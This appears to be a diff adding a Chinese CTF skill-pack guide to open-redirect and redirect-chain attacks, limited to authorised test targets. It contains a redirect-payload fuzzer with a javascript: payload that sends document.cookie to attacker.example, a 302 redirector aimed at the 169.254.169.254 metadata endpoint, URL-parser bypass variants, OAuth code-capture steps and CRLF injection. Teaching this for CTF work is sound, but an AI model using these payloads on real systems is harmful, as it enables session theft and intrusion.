@@ -1,0 +1,257 @@
+# Open Redirect & Redirect Chain Attacks
+
+> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/04-ssrf/open-redirect.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
+> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
+> **什么时候用**：命中「open redirect / 开放重定向 / redirect chain / OAuth redirect」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。
+
+## 适用信号
+
+- open redirect
+- 开放重定向
+- redirect chain
+- OAuth redirect
+- URL redirection bypass
+- parser differential
+- 302
+
+## 前置
+
+- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
+- 工具定位走探测层，别猜路径：
+
+```powershell
+. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
+$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
+& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
+```
+
+- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
+- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
+- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：
+
+| 工具 | 本机状态 | 本机命令 / 替代方案 |
+|---|---|---|
+| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
+| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
+| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
+| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
+| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
+| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
+| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
+| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
+| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
+| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
+| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
+| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
+| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
+| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
+| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
+| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
+| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
+| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
+| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
+| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
+| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
+| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
+| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
+| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |
+
+- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
+  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。
+
+
+## 步骤
+
+本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：
+
+1. 工作流
+2. 参数发现与 URL 矩阵 — 成功样本：Location、meta refresh、JS location、JSON redirect 字段任一指向 attacker，并能被浏览器或下游客户端执行。失败样本：只反射在页面文本，或被规范化成站内路径。
+3. Parser 差分矩阵
+4. OAuth code 回收 — Evidence 必须记录：authorize URL、目标站 Location、listener 收到的 code/state、token endpoint 的成功或失败样本。
+5. SSRF follow redirect — 把 SSRF 参数指向该 listener，如果服务端 HTTP client 跟随 302，下一跳会访问 --target。成功样本是 listener 访问日志加目标侧响应差异；失败样本是只访问第一跳或明确不 fol…
+6. 链路选择
+
+## 判据
+
+判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。
+
+- **命中样本** — `Location` 指向 attacker
+- **失败样本** — 只回相对路径
+- **命中样本** — 校验通过但浏览器跳外域
+- **失败样本** — URL parser 严格规范化
+- **命中样本** — code/token 到 listener
+- **失败样本** — OAuth server 精确匹配
+- **命中样本** — 下游跟随到内网/metadata
+- **失败样本** — follow redirect 关闭
+- **命中样本** — 执行脚本或外带状态
+- **失败样本** — scheme 白名单
+- **命中样本** — 新 header/cache 行为
+- **失败样本** — 换行被编码
+- **命中样本** — 校验看前缀，浏览器到 attacker
+- **命中样本** — 白名单字符串匹配弱
+
+## 坑
+
+- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
+- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
+- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。
+
+## 相关
+
+- 见本技能 `../../SKILL.md` 的 references 索引。
+
+## 技术正文
+
+> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。
+
+开放重定向不是只看 `Location: https://attacker`。CTF 里更常见的是：白名单解析器通过，浏览器/下游客户端跳到另一处；或者 OAuth、SSRF、缓存、meta refresh 把这个跳转当成信任边界。
+
+## 输入信号
+
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `next/redirect/returnUrl` 等参数 | 参数字典 + 302/HTML/JS location oracle | `Location` 指向 attacker | 只回相对路径 |
+| 白名单域校验 | parser 差分矩阵 | 校验通过但浏览器跳外域 | URL parser 严格规范化 |
+| OAuth `redirect_uri` | 一次/二次编码、fragment、userinfo | code/token 到 listener | OAuth server 精确匹配 |
+| SSRF 客户端 follow redirect | 让 trusted URL 302 到 internal | 下游跟随到内网/metadata | follow redirect 关闭 |
+| meta refresh / JS redirect | `javascript:`, `data:`, HTML 注入 | 执行脚本或外带状态 | scheme 白名单 |
+| CRLF in redirect | `%0d%0aSet-Cookie` | 新 header/cache 行为 | 换行被编码 |
+
+## 工作流
+
+```text
+发现 redirect 参数
+  → 建 baseline: 302/Location/HTML/meta/JS
+  → URL parser 差分矩阵
+  → 根据 sink 选择 OAuth/SSRF/cache/XSS/CRLF 链
+  → listener 或业务 oracle 收集成功与失败样本
+```
+
+## 0. 参数发现与 URL 矩阵
+
+```python
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
+import requests
+from urllib.parse import quote
+
+PARAMS = ["redirect","redirect_uri","redirect_url","url","next","return","returnTo","returnUrl","goto","continue","target","dest","destination","callback","back","ref","ru","retUrl"]
+URLS = [
+    "https://attacker.example/cb",
+    "//attacker.example/cb",
+    "///attacker.example/cb",
+    "https://target.example@attacker.example/cb",
+    "https://target.example.attacker.example/cb",
+    "https://attacker.example%23.target.example/cb",
+    "https://attacker.example%3f.target.example/cb",
+    "https:%5c%5cattacker.example%5ccb",
+    "/\\attacker.example/cb",
+    "javascript:location='https://attacker.example/'+document.cookie",
+]
+
+def h(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True, help="endpoint without query")
+    ap.add_argument("--host", default="target.example")
+    args = ap.parse_args()
+    for p in PARAMS:
+        for u in URLS:
+            payload = u.replace("target.example", args.host)
+            r = requests.get(args.url, params={p: payload}, allow_redirects=False, timeout=10)
+            print(json.dumps({"param": p, "payload": payload, "status": r.status_code, "location": r.headers.get("Location",""), "hash": h(r.text), "sample": r.text[:120]}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+成功样本：`Location`、meta refresh、JS location、JSON redirect 字段任一指向 attacker，并能被浏览器或下游客户端执行。失败样本：只反射在页面文本，或被规范化成站内路径。
+
+## 1. Parser 差分矩阵
+
+| 变体 | 绕过点 | 命中样本 |
+|---|---|---|
+| `target.com@attacker.com` | userinfo vs host | 校验看前缀，浏览器到 attacker |
+| `target.com.attacker.com` | suffix/prefix includes | 白名单字符串匹配弱 |
+| `//attacker.com` | scheme-relative | 跳外域 |
+| `\attacker.com` | 反斜杠规范化差异 | 浏览器/代理解释不同 |
+| `%2f%2fattacker.com` | 解码次数差异 | 一层校验一层执行 |
+| `attacker.com#target.com` | fragment 不发给服务端 | OAuth/浏览器解析差异 |
+| punycode/同形字 | 视觉或 IDNA 差异 | 白名单误判 |
+
+## 2. OAuth code 回收
+
+```text
+authorize endpoint
+  → redirect_uri 指向目标站内 open redirect
+  → 目标站 302 到 listener
+  → listener 收到 code/state
+  → token endpoint 交换或证明 code 落点
+```
+
+Evidence 必须记录：`authorize` URL、目标站 `Location`、listener 收到的 `code/state`、token endpoint 的成功或失败样本。
+
+## 3. SSRF follow redirect
+
+```python
+#!/usr/bin/env python3
+import argparse
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class R(BaseHTTPRequestHandler):
+    target = "http://169.254.169.254/latest/meta-data/"
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header("Location", self.target)
+        self.end_headers()
+        self.wfile.write(b"redirecting")
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--listen", default="0.0.0.0")
+    ap.add_argument("--port", type=int, default=8088)
+    ap.add_argument("--target", required=True)
+    args = ap.parse_args()
+    R.target = args.target
+    HTTPServer((args.listen, args.port), R).serve_forever()
+
+if __name__ == "__main__":
+    main()
+```
+
+把 SSRF 参数指向该 listener，如果服务端 HTTP client 跟随 302，下一跳会访问 `--target`。成功样本是 listener 访问日志加目标侧响应差异；失败样本是只访问第一跳或明确不 follow。
+
+## 4. 链路选择
+
+| Redirect sink | 下一跳 |
+|---|---|
+| 登录回跳 | session fixation、phishing 页面、token leak |
+| OAuth redirect_uri | code/token 回收 |
+| SSRF URL | metadata/internal/admin panel |
+| cache/CDN | cache poisoning/web cache deception |
+| meta refresh/JS | XSS/admin bot |
+| CRLF Location | header injection、Set-Cookie/cache |
+
+## 攻击链
+
+```text
+Open Redirect
+  → URL parser 差分
+  → OAuth code / SSRF follow / cache / XSS / CRLF sink
+  → listener 或业务 oracle 证明下一跳
+```
+
+## Evidence
+
+| 项 | 记录内容 |
+|---|---|
+| 入口 | 参数名、请求 URL、状态码、Location/meta/JS/JSON 字段 |
+| URL 差分 | payload、编码层数、服务端校验结果、浏览器实际目标 |
+| 链路 | OAuth/SSRF/cache/XSS/CRLF 的下一跳证据 |
+| 成功样本 | listener 收到 code/token/请求，或业务状态/缓存/header 变化 |
+| 失败样本 | 规范化站内路径、scheme 拒绝、不 follow redirect、state mismatch |
+| 下一跳 | OAuth 转 20-oauth-deep；SSRF 转 ssrf；CRLF 转 hpp-crlf；cache 转 08-infra |
